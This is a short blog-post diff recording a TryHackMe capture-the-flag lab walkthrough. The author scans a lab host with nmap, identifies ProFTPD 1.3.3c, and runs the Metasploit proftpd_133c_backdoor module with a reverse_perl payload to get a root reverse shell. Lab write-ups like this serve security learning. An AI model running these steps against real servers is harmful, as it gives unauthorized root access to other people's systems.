@@ -1,0 +1,39 @@
+---
+layout: post
+title: Capstone
+published: true
+--- 
+**TryHackMe: Capstone**
+--- 
+
+## Process: 
+
+Opened terminal 
+
+Ran nmap –top-ports 10 10.10.172.209 
+
+Found 3 open ports 
+
+Decided to try ftp port 
+
+I wanted to find the version so I used nmap –p 21 –sV 10.10.173.209 and it showed me it was ProFTPD 1.3.3c 
+
+I entered exploit/unix/ftp/proftpd_133c_backdoor 
+
+ Used show options 
+
+Then I set RHOSTS to 10.10.172.209 and LHOSTS to 10.10.139.210  
+
+Show payloads 
+
+I set the PAYLOAD to cmd/unix/reverse_perl and set LHOST to 10.10.139.210 
+
+Set the port number to 21 
+
+Ran exploit which opened the shell! 
+
+I background the shell session 1 with ctrl z  
+
+Opened sessions to see my shell there 
+
+I did whoami and saw I was root 
